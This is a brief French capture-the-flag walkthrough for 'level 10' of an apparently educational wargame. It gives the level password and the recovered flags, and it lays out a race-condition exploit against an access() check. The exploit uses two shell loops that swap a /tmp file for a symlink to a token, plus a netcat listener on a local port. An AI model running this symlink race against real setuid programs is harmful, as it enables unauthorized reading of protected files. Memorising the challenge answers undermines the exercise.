# level 10

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
s5cAJpM8ev6XHw998pRWG728z
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

Ltrace donne pas assez d’info

Donc on utilise `objdump -s ./level10`

On voit que le binaire utilise access(), en regardant ce que fait la fonction on lit qu'elle a un exploit “race condition” (en gros, entre la vérif et l'envoie, t’as un petit temps pour modifier le fichier)

On crée deux programmes
```sh
while [ 1 ]
do
        rm -rf /tmp/wow
        touch /tmp/wow
        rm -rf /tmp/wow
        ln -s ~/token /tmp/wow
done
```
```sh
while [ 1 ]
do
        ~/level10 /tmp/wow 127.0.0.1
done
```
On lance un 3eme pour spy le port `6969`
```cmd
nc -l -k   6969
```

On récupère le flag `woupa2yuojeeaaed06riuj63c`


```cmd
su flag10 woupa2yuojeeaaed06riuj63c
getflag
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
feulo4b72j7edeahuete3no7c
```